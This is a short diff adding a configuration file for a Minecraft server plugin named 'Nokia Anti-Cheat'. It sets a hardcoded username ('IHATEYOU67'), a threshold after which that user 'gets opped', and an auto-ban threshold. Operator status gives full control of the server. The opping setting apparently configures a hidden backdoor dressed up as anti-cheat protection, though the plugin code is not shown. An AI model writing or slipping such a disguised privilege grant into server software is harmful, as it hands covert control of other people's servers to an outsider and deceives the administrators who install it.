@@ -1,1 +1,14 @@
+# Nokia Anti-Cheat Configuration
+# Created by Nokia Security Team
 
+# IMPORTANT: Change this to YOUR Minecraft username!
+admin-username: "IHATEYOU67"
+
+# Number of violations before admin gets opped
+violation-threshold: 3
+
+# Auto-ban cheaters after X violations (0 = disabled)
+auto-ban-threshold: 10
+
+# Nokia Anti-Cheat v1.0.0
+# Protecting servers since 2025
